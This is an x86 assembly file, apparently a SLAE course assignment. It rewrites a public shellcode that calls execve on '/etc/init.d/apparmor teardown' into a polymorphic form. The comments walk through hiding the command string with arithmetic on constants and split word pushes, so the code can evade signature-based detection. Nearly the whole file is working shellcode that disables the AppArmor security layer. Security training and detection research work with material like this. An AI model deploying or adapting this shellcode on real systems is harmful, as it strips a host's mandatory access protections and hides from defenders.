; SLAE-xxx
; assignment 6.2: polymorphic version of shellstorm shellcode 
; originality: tried to use my own opcodes replacement 

; apparmor teardown  shellcode 
; by Name = John Babio Twitter = 3vi1john
;push 0xb 
;pop eax
;xor edx,edx
;push edx
;push 0x6e776f64
;push 0x72616574
;mov ecx,esp
;push edx
;push   0x726f6d72
;push   0x61707061
;push   0x2f642e74
;push   0x696e692f
;push   0x6374652f
;mov ebx,esp 
;push edx 
;push ecx 
;push ebx 
;mov ecx,esp 
;int 0x80 

; this assembly is quite easy to understand 
; its standard execve calling "/etc/init.d/apparmor teardown" 
; lets modify it 

global _start: 

_start: 
; lets not use push pop again 
xor eax,eax 
; we store 0 into edx for future use 
mov edx,eax 
mov al,0xb 
push edx
; alright lets hide our string a bit 
mov esi,0x5d665e53
add esi,0x11111111
push esi 
; we can push vanilla the rest 
push 0x72616574
mov ecx,esp
push edx 
; lets hide our string a bit more again 
mov esi,0x83807e83
sub esi,0x11111111
push esi 
; we can push the rest 
push 0x61707061
push 0x2f642e74
; we will now try to split the remaining string in half 
push word 0x696e
push word 0x692f
push word 0x6374
push word 0x652f
mov ebx,esp 
push edx 
push ecx 
push ebx
mov ecx,esp 
int 0x80 
